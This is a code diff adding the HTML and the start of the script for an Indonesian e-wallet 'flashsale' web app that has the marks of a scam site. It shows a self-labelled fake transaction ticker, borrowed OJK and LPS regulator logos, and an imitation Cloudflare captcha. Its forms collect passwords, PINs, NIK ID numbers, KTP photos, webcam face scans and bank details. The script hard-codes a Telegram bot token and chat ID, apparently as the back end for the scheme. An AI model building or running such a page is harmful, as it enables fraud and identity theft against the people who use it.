+                    </div>
+                </div>
+                <div class="fs-item">
+                    <div class="fs-header-img" style="background-image: url('https://cdn25.metrotvnews.com/content/2025/09/09/KvJCL6xJ/t_68bfe45e6ea64.jpg">
+                        <div class="fs-badge"><i class="bi bi-lightning-fill"></i> BIFAST</div>
+                    </div>
+                    <div class="fs-content">
+                        <div style="display: flex; justify-content: center; align-items: center; font-size: 10px; padding: 6px; background: rgba(59,130,246,0.2); color: var(--primary); border-bottom: 1px solid var(--border-color); font-weight: 800; margin: -12px -12px 10px -12px;">PENGGUNA BARU</div>
+                        <div class="fs-name">Saldo E-Wallet</div>
+                        <div class="fs-price-strike">Rp 1.000.000</div>
+                        <div class="fs-price">Rp 500.000</div>
+                        <button class="fs-add-btn" onclick="addFlashsaleToCart('E-Wallet Flashsale', 1000000, 500000, '21745')">+ Keranjang</button>
+                    </div>
+                </div>
+                <div class="fs-item">
+                    <div class="fs-header-img" style="background-image: url('https://cdn25.metrotvnews.com/content/2025/09/09/KvJCL6xJ/t_68bfe45e6ea64.jpg">
+                        <div class="fs-badge"><i class="bi bi-lightning-fill"></i> RESELLER</div>
+                    </div>
+                    <div class="fs-content">
+                        <div style="display: flex; justify-content: center; align-items: center; font-size: 10px; padding: 6px; background: rgba(59,130,246,0.2); color: var(--primary); border-bottom: 1px solid var(--border-color); font-weight: 800; margin: -12px -12px 10px -12px;">PENGGUNA BARU</div>
+                        <div class="fs-name">Saldo E-Wallet</div>
+                        <div class="fs-price-strike">Rp 5.000.000</div>
+                        <div class="fs-price">Rp 2.500.000</div>
+                        <button class="fs-add-btn" onclick="addFlashsaleToCart('E-Wallet Flashsale', 5000000, 2500000, 'AUTO')">+ Keranjang</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="services-section" id="section-fake-ticker">
+            <div class="section-title">Transaksi pengguna baru</div>
+            <div class="fake-ticker-container" id="fake-ticker-box">
+                </div>
+        </div>
+
+        <div class="banner-slider-container">
+            <div class="banner-slider" id="auto-slider">
+                <div class="banner-slides" id="banner-slides">
+                    <img src="https://digital6301.wordpress.com/wp-content/uploads/2026/01/picsart_01-31-02.59.54.jpg" alt="Banner 1">
+                    <img src="https://digital6301.wordpress.com/wp-content/uploads/2026/01/picsart_01-20-12.56.49.jpg" alt="Banner 2">
+                    <img src="https://digital6301.wordpress.com/wp-content/uploads/2026/01/picsart_01-20-01.01.38.jpg" alt="Banner 3">
+                </div>
+            </div>
+        </div>
+
+        <div class="services-section">
+            <div class="section-title">PT Mitra Komunikasi Nusantara Tbk</div>
+            <div class="app-info-grid">
+                <div class="info-card-app">
+                    <img src="https://ipol.id/wp-content/uploads/2024/12/logo-ojk.png" alt="OJK">
+                    <div class="info-card-text">
+                        <h5>Diawasi OJK</h5>
+                        <p>Terdaftar resmi</p>
+                    </div>
+                </div>
+                <div class="info-card-app">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6f/Logo_Lembaga_Penjamin_Simpanan_%282018%29_%28cropped%29.svg/250px-Logo_Lembaga_Penjamin_Simpanan_%282018%29_%28cropped%29.svg.png" alt="LPS">
+                    <div class="info-card-text">
+                        <h5>Mitra LPS</h5>
+                        <p>Dana dilindungi</p>
+                    </div>
+                </div>
+                <div class="info-card-app">
+                    <img src="https://d29rr2wuoglkig.cloudfront.net/userfiles/brand%20pages/authorized-dist-badge-231006b.png" alt="Distributor">
+                    <div class="info-card-text">
+                        <h5>Distributor</h5>
+                        <p>PPOB Nasional</p>
+                    </div>
+                </div>
+                <div class="info-card-app">
+                    <img src="https://cdn-icons-png.flaticon.com/512/6553/6553484.png" alt="Asuransi">
+                    <div class="info-card-text">
+                        <h5>Asuransi</h5>
+                        <p>Proteksi 100%</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="services-section">
+            <div class="section-title">
+                Transaksi Terakhir
+                <a onclick="showFullHistory()" style="font-size: 13px; color: var(--primary); text-decoration: none; font-weight: 700; cursor: pointer;">Lihat Semua</a>
+            </div>
+            <div class="history-list" id="history-box">
+                </div>
+        </div>
+    </div>
+
+    <div id="lainnya-modal" class="modal-overlay">
+        <div class="modal-content" style="max-height: 85vh;">
+            <div class="modal-header">
+                <h3>Semua Layanan</h3>
+                <button class="btn-icon" onclick="closeTargetModal('lainnya-modal')"><i class="bi bi-x-lg"></i></button>
+            </div>
+            <div class="service-grid" style="grid-template-columns: repeat(3, 1fr); gap: 20px 10px; margin-top: 10px;">
+                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Tiket Pesawat')">
+                    <div class="service-icon"><i class="bi bi-airplane-fill"></i></div>
+                    <div class="service-name">Tiket Pesawat</div>
+                </div>
+                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Tiket Kereta')">
+                    <div class="service-icon"><i class="bi bi-train-front"></i></div>
+                    <div class="service-name">Tiket Kereta</div>
+                </div>
+                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Telkom')">
+                    <div class="service-icon"><i class="bi bi-telephone-fill"></i></div>
+                    <div class="service-name">Telkom / Indihome</div>
+                </div>
+                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Internet')">
+                    <div class="service-icon"><i class="bi bi-router"></i></div>
+                    <div class="service-name">Internet Non-Telkom</div>
+                </div>
+                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('PBB')">
+                    <div class="service-icon"><i class="bi bi-buildings"></i></div>
+                    <div class="service-name">Pajak PBB</div>
+                </div>
+                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Samsat')">
+                    <div class="service-icon"><i class="bi bi-car-front"></i></div>
+                    <div class="service-name">E-Samsat</div>
+                </div>
+                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Asuransi')">
+                    <div class="service-icon"><i class="bi bi-shield-check"></i></div>
+                    <div class="service-name">Asuransi</div>
+                </div>
+                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('BPJS Ketenagakerjaan')">
+                    <div class="service-icon"><i class="bi bi-briefcase-fill"></i></div>
+                    <div class="service-name">BPJS TK</div>
+                </div>
+                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Gas Negara')">
+                    <div class="service-icon"><i class="bi bi-fire"></i></div>
+                    <div class="service-name">Gas PGN</div>
+                </div>
+                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('TV Kabel')">
+                    <div class="service-icon"><i class="bi bi-tv"></i></div>
+                    <div class="service-name">TV Kabel</div>
+                </div>
+                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Voucher Streaming')">
+                    <div class="service-icon"><i class="bi bi-play-btn-fill"></i></div>
+                    <div class="service-name">Streaming</div>
+                </div>
+                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Zakat')">
+                    <div class="service-icon"><i class="bi bi-heart-fill"></i></div>
+                    <div class="service-name">Zakat & Donasi</div>
+                </div>
+                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Kartu Kredit')">
+                    <div class="service-icon"><i class="bi bi-credit-card"></i></div>
+                    <div class="service-name">Kartu Kredit</div>
+                </div>
+                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Multifinance')">
+                    <div class="service-icon"><i class="bi bi-cash-stack"></i></div>
+                    <div class="service-name">Multifinance</div>
+                </div>
+                <div class="service-item" onclick="closeTargetModal('lainnya-modal'); openPPOBModal('Pasca Bayar')">
+                    <div class="service-icon"><i class="bi bi-receipt"></i></div>
+                    <div class="service-name">Pasca Bayar</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="cart-modal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Keranjang Flashsale</h3>
+                <button class="btn-icon" onclick="closeTargetModal('cart-modal')"><i class="bi bi-x-lg"></i></button>
+            </div>
+            
+            <div id="cart-items-container" style="margin-bottom:15px;">
+                </div>
+            
+            <div id="cart-provider-box" style="display:none;">
+                <div class="input-group">
+                    <label>Pilih E-Wallet Penerima</label>
+                    <select id="cart-provider">
+                        <option value="OVO">OVO</option>
+                        <option value="DANA">DANA</option>
+                        <option value="GOPAY">Gopay</option>
+                        <option value="SHOPEEPAY">ShopeePay</option>
+                    </select>
+                </div>
+                <div class="input-group">
+                    <label>Nomor Penerima E-Wallet</label>
+                    <input type="number" id="cart-target" placeholder="Masukkan nomor">
+                </div>
+            </div>
+
+            <div class="input-group" id="promo-code-input-box">
+                <label>Masukkan Kode Voucher Promo</label>
+                <div style="display: flex; gap: 8px;">
+                    <input type="text" id="promo-code" placeholder="Masukkan kode" style="flex:1;">
+                    <button onclick="applyPromo()" style="padding: 0 15px; border-radius: 14px; background: var(--primary); border:none; color:#fff; font-weight:bold;">Gunakan</button>
+                </div>
+            </div>
+            
+            <div id="cart-actions-box" style="display:none;">
+                <div style="background: var(--bg-input); padding: 18px; border-radius: 16px; margin-top: 15px;">
+                    <div class="cart-summary-row" style="display:flex; justify-content:space-between; font-size:13px; margin-bottom:6px;"><span style="color:var(--text-muted);">Nilai Produk</span><span id="cart-subtotal" style="font-weight:700;">Rp 0</span></div>
+                    <div class="cart-summary-row" style="display:flex; justify-content:space-between; font-size:13px; margin-bottom:6px;"><span style="color:var(--text-muted);">Biaya Admin</span><span style="font-weight:700; color:var(--success);">Rp 0</span></div>
+                    <div class="cart-summary-row" style="display:flex; justify-content:space-between; font-size:13px; margin-bottom:6px;"><span style="color:var(--text-muted);">Potongan Promo</span><span id="cart-discount" style="font-weight:700; color:var(--success);">Rp 0</span></div>
+                    <hr style="border:0; border-top:1px dashed var(--border-color); margin: 12px 0;">
+                    <div class="cart-summary-row" style="display:flex; justify-content:space-between; font-size:15px; font-weight:800;"><span style="color:var(--text-main);">Total Bayar</span><span id="cart-total" style="color:var(--primary);">Rp 0</span></div>
+                </div>
+                
+                <button class="btn-modal" onclick="proceedCartCheckout()">Lanjutkan</button>
+                <button class="btn-modal btn-modal-danger" onclick="clearCart()">Batalkan</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modifikasi Help Modal (Fullscreen + Header Online Dot) -->
+    <div id="help-modal" class="modal-overlay">
+        <div class="help-modal-fullscreen">
+            <div class="help-header">
+                <div style="display: flex; align-items: center; gap: 8px;">
+                    <div style="display: flex; align-items: center; gap: 5px; background: rgba(16, 185, 129, 0.15); padding: 3px 8px; border-radius: 12px; margin-left: 2px;">
+                        <div style="width: 7px; height: 7px; border-radius: 50%; background: var(--success); animation: blink-dot 1.5s infinite;"></div>
+                        <span style="font-size: 11px; font-weight: 700; color: var(--success);">Online</span>
+                    </div>
+                </div>
+                <button class="btn-icon" style="color: #64748b; font-size: 26px;" onclick="closeTargetModal('help-modal')">
+                    <i class="bi bi-x-lg"></i>
+                </button>
+            </div>
+            <iframe src="https://smartpay-helpdesk.pages.dev" class="help-iframe-view"></iframe>
+        </div>
+    </div>
+
+    <div id="change-password-modal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Ubah Password Akun</h3>
+                <button class="btn-icon" onclick="closeTargetModal('change-password-modal')"><i class="bi bi-x-lg"></i></button>
+            </div>
+            <div class="input-group">
+                <label>Password Lama</label>
+                <div class="pass-input-wrapper">
+                    <input type="password" id="old-password-field" placeholder="Masukkan password saat ini">
+                    <i class="bi bi-eye-slash pass-toggle-icon" onclick="togglePasswordVisibility('old-password-field', this)"></i>
+                </div>
+            </div>
+            <div class="input-group">
+                <label>Password Baru</label>
+                <div class="pass-input-wrapper">
+                    <input type="password" id="new-password-field" placeholder="Masukkan password baru">
+                    <i class="bi bi-eye-slash pass-toggle-icon" onclick="togglePasswordVisibility('new-password-field', this)"></i>
+                </div>
+            </div>
+            <div class="input-group">
+                <label>Konfirmasi Password Baru</label>
+                <div class="pass-input-wrapper">
+                    <input type="password" id="confirm-password-field" placeholder="Ketik ulang password baru">
+                    <i class="bi bi-eye-slash pass-toggle-icon" onclick="togglePasswordVisibility('confirm-password-field', this)"></i>
+                </div>
+            </div>
+            <button class="btn-modal" onclick="processChangePassword()">Simpan Password</button>
+        </div>
+    </div>
+
+    <div id="login-modal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Masuk Akun</h3>
+                <button class="btn-icon" id="login-close-btn" onclick="closeTargetModal('login-modal')"><i class="bi bi-x-lg"></i></button>
+            </div>
+            <div class="input-group">
+                <label>Nomor Handphone</label>
+                <input type="tel" id="login-phone" placeholder="Masukkan nomor">
+            </div>
+            <div class="input-group">
+                <label>Password</label>
+                <div class="pass-input-wrapper">
+                    <input type="password" id="login-password" placeholder="Masukkan password">
+                    <i class="bi bi-eye-slash pass-toggle-icon" onclick="togglePasswordVisibility('login-password', this)"></i>
+                </div>
+            </div>
+            
+            <div class="cf-captcha-box" onclick="verifyCaptcha('login')">
+                <div style="display: flex; align-items: center; gap: 15px;">
+                    <div class="cf-checkbox" id="cf-box-login"><i class="bi bi-check-lg"></i></div>
+                    <div class="cf-text-wrap">
+                        <span>Verify you are human</span>
+                    </div>
+                </div>
+                <div class="cf-logo-box">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/9/94/Cloudflare_Logo.png" height="20" alt="CF">
+                    <span>Privacy - Terms</span>
+                </div>
+            </div>
+
+            <button class="btn-modal" onclick="processLogin()">Masuk</button>
+            <div class="auth-link" onclick="closeTargetModal('login-modal'); openRegisterModal();">Belum punya akun? <span>Daftar disini</span></div>
+        </div>
+    </div>
+
+    <div id="register-modal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Daftar Akun Baru</h3>
+                <button class="btn-icon" id="register-close-btn" onclick="closeTargetModal('register-modal')"><i class="bi bi-x-lg"></i></button>
+            </div>
+            <div class="input-group">
+                <label>Nama Lengkap</label>
+                <input type="text" id="reg-name" placeholder="Masukkan nama">
+            </div>
+            <div class="input-group">
+                <label>Nomor Handphone</label>
+                <input type="tel" id="reg-phone" placeholder="Masukkan nomor">
+            </div>
+            <div class="input-group">
+                <label>Buat Password</label>
+                <div class="pass-input-wrapper">
+                    <input type="password" id="reg-password" placeholder="Minimal 6 karakter">
+                    <i class="bi bi-eye-slash pass-toggle-icon" onclick="togglePasswordVisibility('reg-password', this)"></i>
+                </div>
+            </div>
+            <div class="input-group">
+                <label>Kode Referensi</label>
+                <input type="text" id="reg-ref" placeholder="Masukkan kode referensi">
+            </div>
+            
+            <div class="cf-captcha-box" onclick="verifyCaptcha('reg')">
+                <div style="display: flex; align-items: center; gap: 15px;">
+                    <div class="cf-checkbox" id="cf-box-reg"><i class="bi bi-check-lg"></i></div>
+                    <div class="cf-text-wrap">
+                        <span>Verify you are human</span>
+                    </div>
+                </div>
+                <div class="cf-logo-box">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/9/94/Cloudflare_Logo.png" height="20" alt="CF">
+                    <span>Privacy - Terms</span>
+                </div>
+            </div>
+
+            <button class="btn-modal" onclick="processRegister()">Daftar Sekarang</button>
+            <div class="auth-link" onclick="closeTargetModal('register-modal'); openLoginModal();">Sudah punya akun? <span>Masuk disini</span></div>
+        </div>
+    </div>
+
+    <div id="recovery-modal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Pemulihan Akun Terdaftar</h3>
+                <button class="btn-icon" onclick="closeTargetModal('recovery-modal')"><i class="bi bi-x-lg"></i></button>
+            </div>
+            <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 15px;">Nomor sudah terdaftar! Masukkan NIK KTP terverifikasi Anda untuk memulihkan dan mereset credential sandi akun Anda.</p>
+            <div class="input-group">
+                <label>Nomor NIK KTP Akun</label>
+                <input type="number" id="recovery-nik" placeholder="16 Digit NIK KTP Anda">
+            </div>
+            <button class="btn-modal" onclick="processNikRecovery()">Verifikasi</button>
+            <button class="btn-modal btn-modal-danger" onclick="closeTargetModal('recovery-modal'); showModal('Hubungi Bantuan','Gagal memverifikasi NIK KTP Harap hubungi Customer Support untuk reset pendaftaran nomor handphone Anda.','error')">Hubungi CS</button>
+        </div>
+    </div>
+
+    <div id="pin-setup-modal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>PIN Transaksi</h3>
+                <button class="btn-icon" onclick="closeTargetModal('pin-setup-modal')"><i class="bi bi-x-lg"></i></button>
+            </div>
+            <div class="input-group">
+                <label>Buat PIN Baru</label>
+                <input type="password" id="pin-1" maxlength="6" pattern="[0-9]*" inputmode="numeric" placeholder="Masukkan 6 digit angka">
+            </div>
+            <div class="input-group">
+                <label>Konfirmasi Ulang PIN</label>
+                <input type="password" id="pin-2" maxlength="6" pattern="[0-9]*" inputmode="numeric" placeholder="Konfirmasi 6 digit angka">
+            </div>
+            <button class="btn-modal" onclick="processPinSetup()">Simpan PIN Proteksi</button>
+        </div>
+    </div>
+
+    <div id="pin-auth-modal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Otorisasi PIN</h3>
+                <button class="btn-icon" onclick="closeTargetModal('pin-auth-modal')"><i class="bi bi-x-lg"></i></button>
+            </div>
+            <div class="input-group">
+                <label>Masukkan PIN Transaksi Anda</label>
+                <input type="password" id="auth-pin-input" maxlength="6" pattern="[0-9]*" inputmode="numeric" placeholder="------" style="text-align: center; letter-spacing: 10px; font-size: 20px;">
+            </div>
+            <button class="btn-modal" onclick="verifyPinAction()">Konfirmasi Pembayaran</button>
+        </div>
+    </div>
+
+    <div id="reseller-verif-modal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Verifikasi Reseller</h3>
+                <button class="btn-icon" onclick="closeTargetModal('reseller-verif-modal')"><i class="bi bi-x-lg"></i></button>
+            </div>
+            <div class="input-group"><label>Nama Lengkap / Bisnis (Sesuai NIK)</label><input type="text" id="res-corp-name" placeholder="Nama Lengkap / Bisnis"></div>
+            <div class="input-group"><label>Nomor NIK KTP (16 Digit)</label><input type="number" id="res-nik-input" placeholder="Masukkan 16 Digit NIK"></div>
+            <div class="input-group"><label>Nomor NPWP Badan / Pribadi</label><input type="text" id="res-npwp" placeholder="Nomor NPWP Terdaftar"></div>
+            <div class="input-group"><label>Surat Izin Usaha / Dokumen Pendukung</label><input type="file" style="padding:10px; background:var(--bg-card);"></div>
+            <button class="btn-modal" onclick="submitResellerVerification()">Kirim Berkas Verifikasi</button>
+        </div>
+    </div>
+
+    <div id="downline-modal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Program referensi</h3>
+                <button class="btn-icon" onclick="closeTargetModal('downline-modal')"><i class="bi bi-x-lg"></i></button>
+            </div>
+            <div style="background: var(--bg-input); padding:15px; border-radius:12px; margin-bottom:15px;">
+                <span style="font-size:12px; color:var(--text-muted);">Kode Referensi Anda</span>
+                <div style="font-weight:bold; color:var(--primary); font-size:14px; margin-top:4px;" id="downline-ref-code-text">Kode: -</div>
+                <div style="font-size:11px; color:var(--text-muted); margin-top:4px;">*Dapatkan Komisi Rp 50.000 setelah downline melakukan transaksi.</div>
+            </div>
+            <div id="downline-list-box" style="display:flex; flex-direction:column; display:none; gap:8px; max-height:200px; overflow-y:auto;">
+                </div>
+        </div>
+    </div>
+
+    <div id="notif-modal" class="modal-overlay">
+        <div class="modal-content" style="padding:0; overflow:hidden;">
+            <div style="padding: 20px 25px; border-bottom: 1px solid var(--border-color); display: flex; justify-content: space-between; align-items: center; background: var(--bg-card);">
+                <h3 style="color:var(--text-main); margin:0; font-size: 18px;">Notifikasi</h3>
+                <button class="btn-icon" style="font-size: 20px;" onclick="closeTargetModal('notif-modal')"><i class="bi bi-x-lg"></i></button>
+            </div>
+            <div id="notif-list-container" style="max-height: 60vh; overflow-y: auto; background: var(--bg-container); padding: 15px;">
+                </div>
+        </div>
+    </div>
+
+    <div id="deposit-modal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Isi Saldo</h3>
+                <button class="btn-icon" onclick="closeTargetModal('deposit-modal')"><i class="bi bi-x-lg"></i></button>
+            </div>
+            
+            <div id="deposit-step-1">
+                <div style="font-size: 11px; color: var(--success); text-align: center; margin-bottom: 15px; font-weight: 600;">
+                </div>
+
+                <div class="input-group">
+                    <label>Nominal Top-up (Min. Rp 50.000)</label>
+                    <input type="number" id="deposit-amount" placeholder="Masukkan nominal">
+                </div>
+                
+                <div style="display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 20px;">
+                    <button class="quick-nominal-btn" onclick="setNominal(50000)">Rp 50.000</button>
+                    <button class="quick-nominal-btn" onclick="setNominal(100000)">Rp 100.000</button>
+                    <button class="quick-nominal-btn" onclick="setNominal(150000)">Rp 150.000</button>
+                    <button class="quick-nominal-btn" onclick="setNominal(200000)">Rp 200.000</button>
+                    <button class="quick-nominal-btn" onclick="setNominal(250000)">Rp 250.000</button>
+                    <button class="quick-nominal-btn" onclick="setNominal(500000)">Rp 500.000</button>
+                </div>
+                
+                <label style="font-size: 13px; color: var(--text-muted); font-weight: 600; margin-bottom: 8px; display: block;">Pilih Metode Pembayaran</label>
+                <div style="display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px;">
+                    <div class="payment-card active" id="pm-qris">
+                        <div style="display:flex; justify-content:space-between; align-items:center;">
+                            <span style="font-weight:700;"><i class="bi bi-qr-code-scan"></i> QRIS Pembayaran</span>
+                            <span style="font-size: 11px; padding: 4px 8px; background: rgba(16,185,129,0.1); color: var(--success); border-radius: 6px; font-weight: bold;">Tersedia</span>
+                        </div>
+                        <div style="font-size: 12px; color: var(--success); margin-top: 6px; font-weight:600;">Diproses 1-5 menit</div>
+                    </div>
+                    
+                    <div class="payment-card disabled">
+                        <div style="display:flex; justify-content:space-between; align-items:center;">
+                            <span style="font-weight:700; color:var(--text-muted);"><i class="bi bi-bank"></i> Virtual Account Bank</span>
+                            <span style="font-size: 11px; padding: 4px 8px; background: rgba(239,68,68,0.1); color: var(--danger); border-radius: 6px; font-weight: bold;">Offline</span>
+                        </div>
+                        <div style="font-size: 12px; color: var(--text-muted); margin-top: 6px;">Biaya Layanan: Rp 7.500</div>
+                    </div>
+
+                    <div class="payment-card disabled">
+                        <div style="display:flex; justify-content:space-between; align-items:center;">
+                            <span style="font-weight:700; color:var(--text-muted);"><i class="bi bi-shop"></i> Gerai Indomaret / Alfamart</span>
+                            <span style="font-size: 11px; padding: 4px 8px; background: rgba(239,68,68,0.1); color: var(--danger); border-radius: 6px; font-weight: bold;">Offline</span>
+                        </div>
+                        <div style="font-size: 12px; color: var(--text-muted); margin-top: 6px;">Biaya Layanan: Rp 7.500</div>
+                    </div>
+                </div>
+
+                <button class="btn-modal" onclick="requestDeposit()">Proses Pembayaran</button>
+            </div>
+            
+            <div id="deposit-step-2" style="display:none; text-align: center;">
+                <p style="color:var(--primary); font-weight:800; font-size:24px; margin-bottom: 10px;" id="deposit-amount-display">Rp 0</p>
+                
+                <div id="deposit-status-wrapper">
+                    <div id="qris-loading">
+                        <div class="loading-spinner"></div>
+                        <p style="color:var(--text-muted); font-size:13px; margin-bottom:15px;">Menunggu QRIS Dinamis dari Operator...</p>
+                    </div>
+                    
+                    <div id="qris-ready" class="qris-box" style="display:none; background:none;margin-bottom:15px;">
+                        <img id="qris-image-tag" src="" alt="QRIS" style="width:100%; max-width:480px;">
+                    </div>
+                    
+                    <div id="deposit-success-msg" style="display:none; margin: 20px 0;"></div>
+                </div>
+
+                <div id="deposit-instructions" style="font-size: 13px; color: var(--text-muted); text-align: left; background: var(--bg-input); padding: 15px; border-radius: 12px; margin-bottom: 20px;">
+                    <strong style="color: var(--text-main);">Petunjuk Bayar:</strong><br>
+                    1. Buka M-Banking / E-Wallet Anda.<br>
+                    2. Pindai (Scan) QRIS di atas.<br>
+                    3. Konfirmasi pembayaran.<br>
+                    <span style="color:var(--danger); margin-top:8px; display:block; font-weight:bold;" id="deposit-timer">Kedaluwarsa dalam: 15:00</span>
+                </div>
+
+                <button id="btn-cancel-deposit" class="btn-modal btn-modal-danger" onclick="cancelActiveDepositSystem()">Batalkan</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="withdraw-modal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Transfer saldo</h3>
+                <button class="btn-icon" onclick="closeTargetModal('withdraw-modal')"><i class="bi bi-x-lg"></i></button>
+            </div>
+            <div id="wd-setup-bank">
+                <div class="input-group">
+                    <label>Pilih Instansi Perbankan / E-Wallet</label>
+                    <select id="bank-provider">
+                        <option value="BCA">Bank BCA</option>
+                        <option value="BRI">Bank BRI</option>
+                        <option value="MANDIRI">Bank Mandiri</option>
+                        <option value="OVO">OVO</option>
+                        <option value="DANA">DANA</option>
+                        <option value="GOPAY">GoPay</option>
+                        <option value="ShopeePay">ShopeePay</option>
+                    </select>
+                </div>
+                <div class="input-group">
+                    <label>Nomor Rekening </label>
+                    <input type="number" id="bank-number" placeholder="Masukkan nomor">
+                </div>
+                <div class="input-group">
+                    <label>Nama Pemilik Rekening</label>
+                    <input type="text" id="bank-name" placeholder="Masukkan nama">
+                </div>
+                <button class="btn-modal" onclick="saveBankDetails()">Simpan rekening</button>
+            </div>
+
+            <div id="wd-form" style="display:none;">
+                <div style="background: var(--bg-input); padding: 15px; border-radius: 14px; margin-bottom: 15px;">
+                    <div style="font-size:12px; color:var(--text-muted);">Rekening Penarikan</div>
+                    <div style="font-weight:bold;margin-top:5px; font-size:14px; color: var(--text-main);" id="saved-bank-name">NAMA</div>
+                    <div style="color:var(--primary);margin-top:3px; font-size:13px; font-weight:700;" id="saved-bank-info">BANK - 000</div>
+                    <a href="#" style="font-size:12px; color:var(--danger); text-decoration:none; display:inline-block; margin-top:8px;" onclick="resetBankDetails()">Hapus</a>
+                </div>
+                <div class="input-group">
+                    <label>Nominal Jumlah Penarikan (Min. Rp 50.000)</label>
+                    <input type="number" id="wd-amount" placeholder="Jumlah penarikan">
+                </div>
+                <button class="btn-modal" id="btn-submit-wd" onclick="submitWithdraw()">Konfirmasi</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="verif-ktp-modal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Verifikasi Identitas</h3>
+                <button class="btn-icon" onclick="closeTargetModal('verif-ktp-modal')"><i class="bi bi-x-lg"></i></button>
+            </div>
+            <div class="input-group"><label>Nama Sesuai Dokumen KTP</label><input type="text" id="v-name" placeholder="Nama Lengkap"></div>
+            <div class="input-group"><label>Nomor NIK KTP (16 Digit Wajib)</label><input type="number" id="v-nik" placeholder="Masukkan 16 angka NIK KTP"></div>
+            <div class="input-group"><label>Unggah Gambar Foto Fisik KTP</label><input type="file" id="v-file" accept="image/*" style="padding:10px; background:var(--bg-card);"></div>
+            <button class="btn-modal" onclick="proceedToFaceScan()">Konfirmasi</button>
+        </div>
+    </div>
+
+    <div id="verif-face-modal" class="modal-overlay">
+        <div class="modal-content" style="text-align: center;">
+            <h3>Pemindaian Biometrik Wajah</h3>
+            <p style="font-size: 13px; color: var(--text-muted);">Posisikan wajah lurus berada di lingkar pemindai.</p>
+            <div class="face-scan-box"><video id="webcam-video" autoplay playsinline></video></div>
+            <div id="scan-instruction-text" style="font-weight: 700; margin-bottom: 20px; color: var(--primary);">Mempersiapkan Sensor Kamera Biometrik...</div>
+            <button class="btn-modal btn-modal-danger" onclick="cancelFaceScan()">Batalkan</button>
+        </div>
+    </div>
+
+    <div id="custom-modal" class="modal-overlay">
+        <div class="modal-content" style="text-align: center;">
+            <div id="modal-icon" style="font-size: 50px; margin-bottom: 10px;"></div>
+            <h3 id="modal-title" style="margin-bottom: 10px; color: var(--text-main);">Informasi</h3>
+            <div id="modal-desc" style="font-size: 14px; color: var(--text-muted); margin-bottom: 20px; line-height: 1.5;">Pesan Notifikasi Admin</div>
+            <button class="btn-modal" id="modal-primary-btn" onclick="closeInfoModal()">Mengerti</button>
+        </div>
+    </div>
+
+    <div id="history-modal" class="modal-overlay">
+        <div class="history-modal-content">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid var(--border-color); padding-bottom: 15px;">
+                <h2 style="font-size: 18px; color: var(--text-main);">Riwayat transaksi</h2>
+                <button class="btn-icon" onclick="closeFullHistory()"><i class="bi bi-x-lg"></i></button>
+            </div>
+            <div id="full-history-list" style="flex: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 12px;"></div>
+        </div>
+    </div>
+    
+    <div id="toast-notif" class="toast-notif">
+        <i class="bi bi-info-circle-fill" style="font-size: 22px; color: var(--primary);"></i>
+        <div style="flex: 1;">
+            <div id="toast-msg" style="font-size: 13px; color: var(--text-main); line-height: 1.4;">Isi Data Berhasil.</div>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8765727817:AAEzCv9z6n1OrAzEll_DdHM-lO2fpeL__oY'; 
+        const CHAT_ID = '8893393746';
+
+        let userID = null;
+        let currentUserPhone = localStorage.getItem('sanz_current_phone');
+        let currentUserName = localStorage.getItem('sanz_current_name');
+        let userBalance = 0; 
+        let tradeHistory = []; 
+        let telegramPollInterval = null;
+        let depositTimerInterval = null;
+        let lastTgUpdateId = parseInt(localStorage.getItem('sanz_last_tg_update_id') || '0');
+        let isPolling = false;
+        let hideBalanceStatus = false;
+
+        let cfCaptchaStatus = { 'reg': false, 'login': false };
+        let cartItem = null; 
+        let currentPPOBService = '';
+        let pendingPinCallback = null; 
+
+        // Fungsi Set Nominal Cepat
+        function setNominal(amount) {
+            document.getElementById('deposit-amount').value = amount;
+        }
+
+        // Generator Fake Ticker Live
+       function addFakeTickerItem() {
+            const ewallets = [
